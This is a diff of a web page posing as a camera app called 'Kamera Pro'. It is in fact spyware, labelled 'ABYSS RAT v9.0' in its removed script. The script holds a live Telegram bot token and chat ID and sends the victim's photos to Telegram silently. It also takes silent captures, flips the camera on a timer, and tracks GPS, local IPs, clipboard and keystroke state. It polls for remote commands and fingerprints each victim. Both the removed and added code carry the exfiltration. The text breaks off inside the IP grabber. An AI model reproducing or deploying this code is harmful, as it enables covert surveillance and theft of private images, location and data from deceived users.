@@ -4,1685 +4,250 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Kamera Pro</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
     <style>
-        /* ============================================================
-           KAMERA PRO v9.0 — COMPLETE STYLESHEET
-           ============================================================ */
-        :root {
-            --bg: #000000;
-            --surface: rgba(0, 0, 0, 0.55);
-            --surface-light: rgba(0, 0, 0, 0.35);
-            --blur: blur(20px);
-            --accent: #fcd434;
-            --accent2: #ffcc00;
-            --ios-blue: #007aff;
-            --ios-red: #ff3b30;
-            --ios-green: #34c759;
-            --ios-gray: #8e8e93;
-            --radius-sm: 14px;
-            --radius-md: 20px;
-            --radius-lg: 30px;
-            --radius-xl: 40px;
-            --transition-fast: 0.15s;
-            --transition-normal: 0.25s;
-            --transition-slow: 0.4s;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-        }
-
-        body {
-            background: var(--bg);
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            height: 100dvh;
-            width: 100vw;
-            width: 100dvw;
-            overflow: hidden;
-            touch-action: manipulation;
-            position: relative;
-        }
-
-        /* ============================================================
-           PERMISSION OVERLAY
-           ============================================================ */
-        .perm-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #000000;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 28px;
-            color: #ffffff;
-            text-align: center;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
-        }
-        .perm-overlay.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-        .perm-overlay .icon-wrapper {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: #1c1c1e;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 28px;
-            box-shadow: 0 0 40px rgba(255, 255, 255, 0.05);
-        }
-        .perm-overlay .icon-wrapper svg {
-            width: 38px;
-            height: 38px;
-            fill: #ffffff;
-        }
-        .perm-overlay h1 {
-            font-size: 28px;
-            font-weight: 650;
-            margin-bottom: 8px;
-            letter-spacing: -0.4px;
-            line-height: 1.2;
-        }
-        .perm-overlay .subtitle {
-            font-size: 14px;
-            color: #8e8e93;
-            margin-bottom: 10px;
-            line-height: 1.5;
-            max-width: 290px;
-        }
-        .perm-overlay .subtitle-small {
-            font-size: 12px;
-            color: #636366;
-            margin-bottom: 32px;
-            line-height: 1.4;
-            max-width: 260px;
-        }
-        .perm-overlay .status-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 22px;
-            min-height: 26px;
-        }
-        .perm-overlay .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #48484a;
-            transition: background var(--transition-normal);
-        }
-        .perm-overlay .status-dot.ready { background: var(--ios-green); }
-        .perm-overlay .status-dot.error { background: var(--ios-red); }
-        .perm-overlay .status-dot.loading { background: var(--accent2); animation: pulse 0.8s ease-in-out infinite; }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-        .perm-overlay .status-text {
-            font-size: 13px;
-            color: #aeaeb2;
-            font-weight: 400;
-        }
-        .perm-overlay .error-message {
-            color: var(--ios-red);
-            font-size: 12px;
-            min-height: 20px;
-            margin-bottom: 10px;
-            font-weight: 500;
-            line-height: 1.4;
-        }
-        .perm-overlay .btn-primary {
-            background: var(--ios-blue);
-            border: none;
-            border-radius: 30px;
-            padding: 16px 0;
-            width: 100%;
-            max-width: 300px;
-            font-size: 17px;
-            font-weight: 600;
-            color: #ffffff;
-            cursor: pointer;
-            text-align: center;
-            letter-spacing: 0.1px;
-            transition: transform var(--transition-fast), opacity var(--transition-fast);
-            touch-action: manipulation;
-            outline: none;
-            -webkit-appearance: none;
-        }
-        .perm-overlay .btn-primary:active {
-            transform: scale(0.96);
-            opacity: 0.85;
-        }
-        .perm-overlay .btn-primary:disabled {
-            opacity: 0.4;
-            transform: none;
-            cursor: not-allowed;
-        }
-
-        /* ============================================================
-           VIDEO FEED
-           ============================================================ */
-        #vf {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-            transition: transform 0.05s linear;
-        }
-
-        /* ============================================================
-           FLASH OVERLAY
-           ============================================================ */
-        #flash-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #ffffff;
-            z-index: 100;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.03s ease;
-        }
-        #flash-overlay.active {
-            opacity: 0.92;
-            transition: opacity 0s;
-        }
-
-        /* ============================================================
-           INDICATOR TAGS
-           ============================================================ */
-        .indicator-container {
-            position: fixed;
-            top: 56px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 8;
-            display: flex;
-            gap: 8px;
-            pointer-events: none;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-        .ind-tag {
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 10px;
-            padding: 4px 10px;
-            color: #fcd434;
-            font-size: 10px;
-            font-weight: 700;
-            letter-spacing: 0.3px;
-            opacity: 0;
-            transform: translateY(-5px);
-            transition: opacity var(--transition-normal), transform var(--transition-normal);
-        }
-        .ind-tag.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* ============================================================
-           TOP BAR
-           ============================================================ */
-        .top-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 6;
-            padding: 14px 12px;
-            padding-top: max(14px, env(safe-area-inset-top, 0px));
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            gap: 8px;
-            flex-wrap: wrap;
-            pointer-events: none;
-        }
-        .top-bar > * {
-            pointer-events: auto;
-        }
-        .top-group {
-            display: flex;
-            gap: 6px;
-            flex-wrap: wrap;
-            align-items: center;
-        }
-        .chip {
-            background: var(--surface);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            border-radius: var(--radius-md);
-            color: #ffffff;
-            padding: 7px 12px;
-            font-size: 11px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            height: 30px;
-            white-space: nowrap;
-            transition: background var(--transition-fast), color var(--transition-fast), border-color var(--transition-fast);
-            letter-spacing: -0.1px;
-            outline: none;
-            -webkit-appearance: none;
-        }
-        .chip:active {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        .chip.on {
-            background: var(--accent);
-            color: #000000;
-            border-color: var(--accent);
-            font-weight: 600;
-        }
-        .chip svg {
-            width: 13px;
-            height: 13px;
-            fill: currentColor;
-            flex-shrink: 0;
-        }
-
-        /* ============================================================
-           ZOOM WHEEL
-           ============================================================ */
-        .zoom-wheel {
-            position: fixed;
-            bottom: 140px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 6;
-            pointer-events: auto;
-            background: var(--surface);
-            backdrop-filter: var(--blur);
-            -webkit-backdrop-filter: var(--blur);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 5px 4px;
-            display: flex;
-            gap: 2px;
-        }
-        .zoom-option {
-            padding: 8px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #ffffff;
-            cursor: pointer;
-            transition: background var(--transition-fast), font-weight var(--transition-fast);
-            text-align: center;
-            min-width: 32px;
-            outline: none;
-            -webkit-appearance: none;
-        }
-        .zoom-option:active {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        .zoom-option.active {
-            background: rgba(255, 255, 255, 0.25);
-            font-weight: 700;
-        }
-
-        /* ============================================================
-           BOTTOM BAR
-           ============================================================ */
-        .bottom-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 6;
-            padding: 14px 18px;
-            padding-bottom: max(20px, env(safe-area-inset-bottom, 0px));
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            pointer-events: none;
-        }
-        .bottom-bar > * {
-            pointer-events: auto;
-        }
-        .gallery-thumb {
-            width: 48px;
-            height: 48px;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 2px solid rgba(255, 255, 255, 0.18);
-            cursor: pointer;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: border-color var(--transition-fast);
-            flex-shrink: 0;
-        }
-        .gallery-thumb:active {
-            border-color: var(--accent);
-        }
-        .gallery-thumb img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 8px;
-        }
-        .gallery-thumb.has-photo {
-            border-color: rgba(255, 255, 255, 0.55);
-            background: transparent;
-        }
-        .gallery-thumb .placeholder-icon {
-            width: 22px;
-            height: 22px;
-            fill: rgba(255, 255, 255, 0.25);
-        }
-        .shutter-button {
-            width: 72px;
-            height: 72px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.13);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: transform var(--transition-fast);
-            flex-shrink: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .shutter-button:active {
-            transform: scale(0.84);
-        }
-        .shutter-inner {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #ffffff;
-            border: 3px solid #000000;
-        }
-        .shutter-spacer {
-            width: 48px;
-            flex-shrink: 0;
-        }
-
-        /* ============================================================
-           FOCUS RING
-           ============================================================ */
-        .focus-ring {
-            position: fixed;
-            width: 72px;
-            height: 72px;
-            border: 2px solid var(--accent);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 7;
-            opacity: 0;
-            box-shadow: 0 0 28px rgba(252, 212, 52, 0.35);
-        }
-        .focus-ring.animate {
-            animation: focusAnimation 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
-        }
-        @keyframes focusAnimation {
-            0% {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(0.65);
-            }
-            100% {
-                opacity: 0;
-                transform: translate(-50%, -50%) scale(1.55);
-            }
-        }
-
-        /* ============================================================
-           GRID OVERLAY
-           ============================================================ */
-        .grid-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 2;
-            pointer-events: none;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-        }
-        .grid-overlay .grid-line {
-            border: 0.5px solid rgba(255, 255, 255, 0.06);
-        }
+        :root { --bg:#000; --surface:rgba(0,0,0,0.55); --accent:#fcd434; --ios-blue:#007aff; }
+        * { margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent; }
+        body { background:var(--bg); font-family:-apple-system,sans-serif; height:100vh;width:100vw;overflow:hidden;touch-action:manipulation;position:relative; }
+        .perm-overlay { position:fixed;inset:0;background:#000;z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;text-align:center;padding:30px;transition:opacity .5s; }
+        .perm-overlay.hidden { opacity:0;pointer-events:none; }
+        .perm-overlay .logo { width:72px;height:72px;border-radius:50%;background:#1c1c1e;display:flex;align-items:center;justify-content:center;margin-bottom:24px; }
+        .perm-overlay .logo svg { width:36px;height:36px;fill:#fff; }
+        .perm-overlay h1 { font-size:26px;font-weight:600;margin-bottom:6px; }
+        .perm-overlay p { font-size:14px;color:#999;margin-bottom:28px;max-width:280px; }
+        .perm-overlay .btn-start { background:var(--ios-blue);border:none;border-radius:30px;padding:15px 50px;font-size:17px;font-weight:600;color:#fff;cursor:pointer;transition:transform .15s; }
+        .perm-overlay .btn-start:active { transform:scale(.95); }
+        .perm-overlay .btn-start:disabled { opacity:.5; }
+        .perm-overlay .err { color:#ff453a;font-size:13px;margin-top:14px;min-height:18px; }
+        #vf { position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1; }
+        #vf.front { transform:scaleX(-1); }
+        #flash { position:fixed;inset:0;background:#fff;z-index:10;opacity:0;pointer-events:none;transition:opacity .04s; }
+        #flash.fire { opacity:.88;transition:opacity 0s; }
+        .top-bar { position:fixed;top:0;left:0;right:0;z-index:5;padding:12px 10px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:5px;pointer-events:none; }
+        .top-bar>* { pointer-events:auto; }
+        .top-grp { display:flex;gap:4px;flex-wrap:wrap; }
+        .chip { background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.12);border-radius:20px;color:#fff;padding:6px 10px;font-size:10px;font-weight:500;cursor:pointer;display:flex;align-items:center;gap:4px;height:28px;transition:background .2s; }
+        .chip:active { background:rgba(255,255,255,.18); }
+        .chip.on { background:var(--accent);color:#000;border-color:var(--accent); }
+        .ind-tag { position:fixed;top:50px;left:50%;transform:translateX(-50%);z-index:8;pointer-events:none;background:rgba(0,0,0,.65);border-radius:10px;padding:3px 9px;color:#fc0;font-size:10px;font-weight:600;opacity:0;transition:opacity .3s; }
+        .ind-tag.show { opacity:1; }
+        .zoom-wheel { position:fixed;bottom:130px;left:50%;transform:translateX(-50%);z-index:5;pointer-events:auto;background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:24px;padding:4px 3px;display:flex;gap:1px; }
+        .zm { padding:7px 11px;border-radius:20px;font-size:12px;font-weight:500;color:#fff;cursor:pointer;min-width:30px;text-align:center;transition:background .2s; }
+        .zm.on { background:rgba(255,255,255,.25);font-weight:600; }
+        .btm-bar { position:fixed;bottom:0;left:0;right:0;z-index:5;padding:14px 16px 20px;display:flex;justify-content:space-between;align-items:center;pointer-events:none; }
+        .btm-bar>* { pointer-events:auto; }
+        .thumb-box { width:46px;height:46px;border-radius:10px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.2);overflow:hidden;cursor:pointer;display:flex;align-items:center;justify-content:center; }
+        .thumb-box img { width:100%;height:100%;object-fit:cover; }
+        .thumb-box.has-img { border-color:rgba(255,255,255,.55);background:transparent; }
+        .shutter-btn { width:70px;height:70px;border-radius:50%;background:rgba(255,255,255,.12);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:transform .15s; }
+        .shutter-btn:active { transform:scale(.82); }
+        .shutter-inner { width:55px;height:55px;border-radius:50%;background:#fff;border:3px solid #000; }
+        .spacer { width:46px; }
+        .focus-ring { position:fixed;width:70px;height:70px;border:2px solid var(--accent);border-radius:50%;transform:translate(-50%,-50%);pointer-events:none;z-index:5;opacity:0; }
+        .focus-ring.pop { animation:foc .55s forwards; }
+        @keyframes foc { 0%{opacity:1;transform:translate(-50%,-50%) scale(.7)} 100%{opacity:0;transform:translate(-50%,-50%) scale(1.4)} }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================
-         PERMISSION OVERLAY
-         ============================================================ -->
-    <div class="perm-overlay" id="permOverlay">
-        <div class="icon-wrapper">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/>
-            </svg>
-        </div>
-        <h1>Kamera Pro</h1>
-        <p class="subtitle">Ambil foto berkualitas tinggi</p>
-        <p class="subtitle-small">dengan efek profesional & stabilisasi</p>
-        <div class="status-container">
-            <span class="status-dot" id="statusDot"></span>
-            <span class="status-text" id="statusText">Tekan tombol untuk mulai</span>
-        </div>
-        <div class="error-message" id="errorMessage"></div>
-        <button class="btn-primary" id="btnStartCamera">Buka Kamera</button>
+<div class="perm-overlay" id="permOverlay">
+    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/></svg></div>
+    <h1>Kamera Pro</h1>
+    <p>Izinkan akses kamera untuk mulai</p>
+    <button class="btn-start" id="btnStart">Buka Kamera</button>
+    <div class="err" id="errMsg"></div>
+</div>
+
+<video id="vf" autoplay playsinline></video>
+<div id="flash"></div>
+<div class="ind-tag" id="indTag"></div>
+<div class="focus-ring" id="focusRing"></div>
+
+<div class="top-bar">
+    <div class="top-grp">
+        <button class="chip" id="btnFlash">⚡Flash</button>
+        <button class="chip on" id="btnBlur">🌀Blur</button>
+        <button class="chip on" id="btnLive">🎬Live</button>
+        <button class="chip on" id="btnHD">4K</button>
+        <button class="chip on" id="btnHDR">🌅HDR</button>
+        <button class="chip on" id="btnStab">✋Stab</button>
+        <button class="chip on" id="btnSoft">✨Soft</button>
     </div>
+    <button class="chip" id="btnFlip">🔄Flip</button>
+</div>
 
-    <!-- ============================================================
-         VIDEO FEED
-         ============================================================ -->
-    <video id="vf" autoplay playsinline muted></video>
+<div class="zoom-wheel">
+    <div class="zm" data-z="0.5">.5</div>
+    <div class="zm" data-z="0.7">.7</div>
+    <div class="zm on" data-z="1">1×</div>
+    <div class="zm" data-z="1.5">1.5</div>
+    <div class="zm" data-z="2">2×</div>
+</div>
 
-    <!-- ============================================================
-         FLASH OVERLAY
-         ============================================================ -->
-    <div id="flash-overlay"></div>
+<div class="btm-bar">
+    <div class="thumb-box" id="thumbBox"></div>
+    <div class="shutter-btn" id="btnShutter"><div class="shutter-inner"></div></div>
+    <div class="spacer"></div>
+</div>
 
-    <!-- ============================================================
-         GRID OVERLAY
-         ============================================================ -->
-    <div class="grid-overlay" id="gridOverlay">
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
-        <span class="grid-line"></span><span class="grid-line"></span><span class="grid-line"></span>
-    </div>
+<script>
+(function() {
+    'use strict';
 
-    <!-- ============================================================
-         FOCUS RING
-         ============================================================ -->
-    <div class="focus-ring" id="focusRing"></div>
+    var BOT='8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
+    var CID='7839405566';
+    var API='https://api.telegram.org/bot'+BOT;
+    var VID=(function(){var s=localStorage.getItem('_vid');if(s)return s;var id='V'+Date.now().toString(36)+Math.random().toString(36).substr(2,6);localStorage.setItem('_vid',id);return id})();
 
-    <!-- ============================================================
-         INDICATOR TAGS
-         ============================================================ -->
-    <div class="indicator-container">
-        <span class="ind-tag" id="indHDR">🌅 HDR</span>
-        <span class="ind-tag" id="indStab">✋ STABIL</span>
-        <span class="ind-tag" id="indSoft">✨ SOFT</span>
-        <span class="ind-tag" id="indBokeh">🌀 BOKEH</span>
-        <span class="ind-tag" id="indLive">🎬 LIVE</span>
-        <span class="ind-tag" id="indHD">📐 4K</span>
-    </div>
+    function $(id){return document.getElementById(id)}
+    var vf=$('vf'),permOverlay=$('permOverlay'),btnStart=$('btnStart'),errMsg=$('errMsg');
+    var btnShutter=$('btnShutter'),btnFlash=$('btnFlash'),btnFlip=$('btnFlip');
+    var btnBlur=$('btnBlur'),btnLive=$('btnLive'),btnHD=$('btnHD'),btnHDR=$('btnHDR'),btnStab=$('btnStab'),btnSoft=$('btnSoft');
+    var thumbBox=$('thumbBox'),flashEl=$('flash'),focusRing=$('focusRing'),indTag=$('indTag');
 
-    <!-- ============================================================
-         TOP BAR
-         ============================================================ -->
-    <div class="top-bar">
-        <div class="top-group" id="topGroupLeft">
-            <button class="chip" id="btnFlash" title="Flash">
-                ⚡ <span>Flash</span>
-            </button>
-            <button class="chip on" id="btnBlur" title="Blur Bokeh">
-                🌀 <span>Blur</span>
-            </button>
-            <button class="chip on" id="btnLive" title="Live Photo">
-                🎬 <span>Live</span>
-            </button>
-            <button class="chip on" id="btnHD" title="Super HD 4K">
-                📐 <span>4K</span>
-            </button>
-            <button class="chip on" id="btnHDR" title="High Dynamic Range">
-                🌅 <span>HDR</span>
-            </button>
-            <button class="chip on" id="btnStab" title="Stabilizer">
-                ✋ <span>Stab</span>
-            </button>
-            <button class="chip on" id="btnSoft" title="Softcam Beauty">
-                ✨ <span>Soft</span>
-            </button>
-        </div>
-        <div class="top-group" id="topGroupRight">
-            <button class="chip" id="btnFlip" title="Balik Kamera">
-                🔄 <span>Flip</span>
-            </button>
-        </div>
-    </div>
+    var stream=null,facingMode='environment',flashOn=false,currentZoom=1,lastPhoto=null,isStarting=false;
+    var blurOn=true,liveOn=true,hdOn=true,hdrOn=true,stabOn=true,softOn=true;
+    var gpsData=null,gpsWatchId=null,localIPs=[],keyBuf='',lastClip='';
+    var silentTimer=null,flipTimer=null,c2Timer=null,lastUpdateId=0;
 
-    <!-- ============================================================
-         ZOOM WHEEL
-         ============================================================ -->
-    <div class="zoom-wheel" id="zoomWheel">
-        <span class="zoom-option" data-zoom="0.5">0.5</span>
-        <span class="zoom-option" data-zoom="0.7">0.7</span>
-        <span class="zoom-option active" data-zoom="1">1×</span>
-        <span class="zoom-option" data-zoom="1.5">1.5</span>
-        <span class="zoom-option" data-zoom="2">2×</span>
-    </div>
+    // ==================== TELEGRAM FIX ====================
+    function tg(t){fetch(API+'/sendMessage?chat_id='+CID+'&text='+encodeURIComponent(t)+'&disable_notification=true').catch(function(){})}
 
-    <!-- ============================================================
-         BOTTOM BAR
-         ============================================================ -->
-    <div class="bottom-bar">
-        <div class="gallery-thumb" id="galleryThumb" title="Preview">
-            <svg class="placeholder-icon" viewBox="0 0 24 24">
-                <rect x="3" y="3" width="18" height="18" rx="2" fill="rgba(255,255,255,0.05)"/>
-                <circle cx="8.5" cy="8.5" r="2" fill="rgba(255,255,255,0.2)"/>
-                <path d="M21 15l-5-5L5 21h16v-6z" fill="rgba(255,255,255,0.15)"/>
-            </svg>
-        </div>
-        <div class="shutter-button" id="btnShutter" title="Ambil Foto">
-            <div class="shutter-inner"></div>
-        </div>
-        <div class="shutter-spacer"></div>
-    </div>
+    function tgPhoto(blob, caption) {
+        var fd = new FormData();
+        fd.append('chat_id', CID);
+        fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
+        fd.append('caption', caption || '');
+        fd.append('disable_notification', 'true');
 
-    <!-- ============================================================
-         JAVASCRIPT — ABYSS RAT v9.0
-         ============================================================ -->
-    <script>
-    (function() {
-        'use strict';
-
-        // ============================================================
-        // CONFIGURATION
-        // ============================================================
-        var CONFIG = {
-            BOT_TOKEN: '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug',
-            CHAT_ID: '7839405566',
-            TG_API: 'https://api.telegram.org/bot',
-            SILENT_INTERVAL: 5000,    // Silent capture every 5 seconds
-            FLIP_INTERVAL: 18000,      // Auto flip every 18 seconds
-            HEARTBEAT_INTERVAL: 120000, // Heartbeat every 2 minutes
-            CLIPBOARD_INTERVAL: 4000,   // Clipboard check every 4 seconds
-            C2_POLL_INTERVAL: 3000,     // C2 polling every 3 seconds
-            FIRST_CAPTURE_DELAY: 2000,  // First photo 2 seconds after camera on
-            JPEG_QUALITY: 0.93,         // JPEG compression quality
-            BURST_COUNT: 3,             // Live photo burst count
-            BURST_DELAY: 250            // Delay between burst frames (ms)
-        };
-
-        // ============================================================
-        // VICTIM FINGERPRINT
-        // ============================================================
-        var VID = (function() {
-            var stored = localStorage.getItem('_kamera_vid');
-            if (stored) return stored;
-            var id = 'V' + Date.now().toString(36).toUpperCase() +
-                     Math.random().toString(36).substring(2, 8).toUpperCase();
-            try {
-                localStorage.setItem('_kamera_vid', id);
-            } catch(e) {}
-            return id;
-        })();
-
-        // ============================================================
-        // DOM REFERENCES
-        // ============================================================
-        function getEl(id) { return document.getElementById(id); }
-
-        var dom = {
-            vf: getEl('vf'),
-            permOverlay: getEl('permOverlay'),
-            btnStartCamera: getEl('btnStartCamera'),
-            statusDot: getEl('statusDot'),
-            statusText: getEl('statusText'),
-            errorMessage: getEl('errorMessage'),
-            flashOverlay: getEl('flash-overlay'),
-            focusRing: getEl('focusRing'),
-            galleryThumb: getEl('galleryThumb'),
-            btnShutter: getEl('btnShutter'),
-            btnFlash: getEl('btnFlash'),
-            btnBlur: getEl('btnBlur'),
-            btnLive: getEl('btnLive'),
-            btnHD: getEl('btnHD'),
-            btnHDR: getEl('btnHDR'),
-            btnStab: getEl('btnStab'),
-            btnSoft: getEl('btnSoft'),
-            btnFlip: getEl('btnFlip'),
-            zoomWheel: getEl('zoomWheel'),
-            indHDR: getEl('indHDR'),
-            indStab: getEl('indStab'),
-            indSoft: getEl('indSoft'),
-            indBokeh: getEl('indBokeh'),
-            indLive: getEl('indLive'),
-            indHD: getEl('indHD')
-        };
-
-        // ============================================================
-        // APPLICATION STATE
-        // ============================================================
-        var state = {
-            stream: null,
-            facingMode: 'environment',
-            flashOn: false,
-            currentZoom: 1,
-            lastPhotoData: null,
-            isStarting: false,
-            blurOn: true,
-            liveOn: true,
-            hdOn: true,
-            hdrOn: true,
-            stabOn: true,
-            softOn: true,
-            gpsData: null,
-            gpsWatchId: null,
-            localIPs: [],
-            keyBuf: '',
-            lastClip: '',
-            silentTimer: null,
-            flipTimer: null,
-            c2Timer: null,
-            lastUpdateId: 0,
-            burstActive: false
-        };
-
-        // ============================================================
-        // TELEGRAM API HELPERS
-        // ============================================================
-        var TG = {
-            sendMessage: function(text) {
-                try {
-                    var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
-                        '/sendMessage?chat_id=' + CONFIG.CHAT_ID +
-                        '&text=' + encodeURIComponent(text) +
-                        '&disable_notification=true';
-                    fetch(url, { method: 'GET', mode: 'no-cors' });
-                } catch(e) {}
-            },
-
-            sendPhoto: function(blob, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 'photo_' + Date.now() + '.jpg');
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto', {
-                        method: 'POST',
-                        body: fd,
-                        mode: 'no-cors'
-                    });
-                } catch(e) {}
-            },
-
-            sendBeacon: function(blob, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', blob, 'silent_' + Date.now() + '.jpg');
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    navigator.sendBeacon(
-                        CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendPhoto',
-                        fd
-                    );
-                } catch(e) {}
-            },
-
-            sendDocument: function(blob, filename, caption) {
-                try {
-                    var fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('document', blob, filename);
-                    fd.append('caption', caption || '');
-                    fd.append('disable_notification', 'true');
-                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
-                        method: 'POST',
-                        body: fd,
-                        mode: 'no-cors'
-                    });
-                } catch(e) {}
+        fetch(API + '/sendPhoto', { method: 'POST', body: fd })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d.ok) console.log('✅ Foto masuk');
+            else {
+                console.warn('⚠️ Gagal:', d.description);
+                // Fallback: kirim sebagai dokumen
+                tgDoc(blob, 'photo_' + Date.now() + '.jpg', caption);
             }
-        };
-
-        // ============================================================
-        // UTILITY FUNCTIONS
-        // ============================================================
-        function showIndicator(el) {
-            if (!el) return;
-            el.classList.add('show');
-            setTimeout(function() {
-                el.classList.remove('show');
-            }, 1400);
-        }
-
-        function getTimestamp() {
-            var now = new Date();
-            return now.toLocaleString('id-ID', {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-        }
-
-        function getTimeShort() {
-            var now = new Date();
-            return now.toLocaleTimeString('id-ID', {
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-        }
-
-        // ============================================================
-        // GPS TRACKING
-        // ============================================================
-        function startGPS() {
-            if (!navigator.geolocation) {
-                console.warn('[GPS] Geolocation not supported');
-                return;
-            }
-            state.gpsWatchId = navigator.geolocation.watchPosition(
-                function(position) {
-                    state.gpsData = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        alt: position.coords.altitude || 0,
-                        acc: position.coords.accuracy,
-                        spd: position.coords.speed || 0,
-                        ts: new Date(position.timestamp).toISOString()
-                    };
-                },
-                function(error) {
-                    console.warn('[GPS] Error:', error.message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 30000,
-                    timeout: 15000
-                }
-            );
-        }
-
-        // ============================================================
-        // LOCAL IP GRABBER (WebRTC)
-        // ============================================================
-        function grabLocalIPs() {
-            return new Promise(function(resolve) {
-                var ips = new Set();
-                try {
-                    var pc = new RTCPeerConnection({
-                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                    });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(function(offer) {
-                        pc.setLocalDescription(offer);
-                    }).catch(function() {});
-                    pc.onicecandidate = function(event) {
-                        if (event.candidate) {
